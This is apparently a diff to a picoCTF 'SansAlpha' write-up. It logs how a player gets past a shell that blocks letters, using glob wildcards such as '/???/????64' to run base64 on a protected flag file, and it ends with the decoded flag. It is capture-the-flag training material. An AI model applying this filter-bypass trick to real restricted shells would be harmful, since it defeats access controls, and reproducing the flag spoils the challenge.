@@ -60,4 +60,55 @@ bash: ./blargh: Is a directory
 SansAlpha$ ./??????/*
 bash: ./blargh/flag.txt: Permission denied
 
+
+SansAlpha$ /?
+bash: /?: No such file or directory
+
+SansAlpha$ /??
+bash: /??: No such file or directory
+
+SansAlpha$ /???
+bash: /bin: Is a directory
+
+SansAlpha$ /????
+bash: /boot: Is a directory
+
+SansAlpha$ /????
+bash: /boot: Is a directory
+
+SansAlpha$ /?????
+bash: /lib32: Is a directory
+
+SansAlpha$ /??????
+bash: /libx32: Is a directory
+
+SansAlpha$ /???????
+bash: /???????: No such file or directory
+
+SansAlpha$ /???/?
+/bin/[: missing ‘]’
+
+SansAlpha$ /???/???
+E: Invalid operation /bin/awk
+
 -This are called wild cards 
+
+SansAlpha$ _1=(/???/????64)
+SansAlpha$ "${_1[0]}" */????.???
+cmV0dXJuIDAgcGljb0NURns3aDE1X211MTcxdjNyNTNfMTVfbTRkbjM1NV8xNDUyNTZlY30=
+
+Traceback (most recent call last):
+  File "/usr/local/sansalpha.py", line 11, in <module>
+    user_in = input("SansAlpha$ ")
+  File "/usr/local/lib/python3.8/dist-packages/pwnlib/term/readline.py", line 448, in str_input
+    return readline(-1, prompt, float).decode()
+  File "/usr/local/lib/python3.8/dist-packages/pwnlib/term/readline.py", line 409, in readline
+    control_c()
+  File "/usr/local/lib/python3.8/dist-packages/pwnlib/term/readline.py", line 261, in control_c
+    raise KeyboardInterrupt
+KeyboardInterrupt
+Connection to mimas.picoctf.net closed.
+diva_bs-picoctf@webshell:~$ echo "cmV0dXJuIDAgcGljb0NURns3aDE1X211MTcxdjNyNTNfMTVfbTRkbjM1NV8xNDUyNTZlY30=" > f.txt
+diva_bs-picoctf@webshell:~$ base64 -d f.txt                                               
+return 0 picoCTF{7h15_mu171v3r53_15_m4dn355_145256ec}
+diva_bs-picoctf@webshell:~$
